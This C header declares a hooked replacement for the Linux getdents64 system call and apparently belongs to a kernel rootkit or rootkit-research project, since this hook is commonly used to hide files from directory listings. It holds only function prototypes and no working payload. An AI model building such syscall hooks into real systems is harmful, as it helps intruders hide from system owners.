#pragma once

#include "../syscalls.h"

#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int hook_getdents64(const struct pt_regs* regs);
#else
asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64* dirent, unsigned int count);
#endif
